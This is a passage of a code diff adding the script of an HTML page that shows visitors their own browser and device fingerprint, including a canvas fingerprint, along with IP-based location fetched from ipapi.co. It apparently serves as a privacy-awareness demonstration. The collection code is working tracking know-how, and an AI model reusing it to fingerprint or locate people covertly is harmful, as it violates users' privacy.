+    const { browser, os } = parseUA(ua);
+    set('d-browser', browser);
+    set('d-os',      os);
+    set('d-screen',  screen.width + ' × ' + screen.height + ' @ ' + screen.colorDepth + '-bit');
+    set('d-cpu',     navigator.hardwareConcurrency ? navigator.hardwareConcurrency + ' logical threads' : 'Not disclosed');
+    set('d-mem',     navigator.deviceMemory ? '≥ ' + navigator.deviceMemory + ' GB (bucketed)' : 'Not disclosed');
+    set('d-lang',    navigator.language + (navigator.languages?.length > 1 ? '  [' + Array.from(navigator.languages).slice(0,3).join(', ') + ']' : ''));
+    set('d-touch',   navigator.maxTouchPoints > 0 ? 'Yes (' + navigator.maxTouchPoints + ' points)' : 'No');
+    set('d-dnt',     navigator.doNotTrack === '1' ? 'Enabled — ignored by attackers' : 'Not set / Disabled');
+    set('d-conn',    navigator.connection?.effectiveType || navigator.connection?.type || 'Not disclosed');
+    set('d-canvas',  getCanvasFingerprint());
+
+    // Use already-fetched geo if available, otherwise try again
+    if (!geoData) {
+      try { const r = await fetch('https://ipapi.co/json/'); geoData = await r.json(); } catch (_) {}
+    }
+
+    if (geoData) {
+      set('d-ip',      geoData.ip || 'Unavailable');
+      set('d-city',    geoData.city || 'Unavailable');
+      set('d-region',  (geoData.region || '') + (geoData.region_code ? ' (' + geoData.region_code + ')' : '') || 'Unavailable');
+      set('d-country', (geoData.country_name || '') + (geoData.country ? ' (' + geoData.country + ')' : ''));
+      set('d-org',     geoData.org || geoData.asn || 'Unavailable');
+      set('d-coords',  geoData.latitude != null ? geoData.latitude.toFixed(4) + ', ' + geoData.longitude.toFixed(4) : 'Unavailable');
+    } else {
+      ['d-ip','d-city','d-region','d-country','d-org','d-coords'].forEach(function(id) {
+        set(id, 'Blocked by VPN/proxy (network layer still logged your real IP)');
+      });
+    }
+  }
+</script>
+
+</body>
+</html>
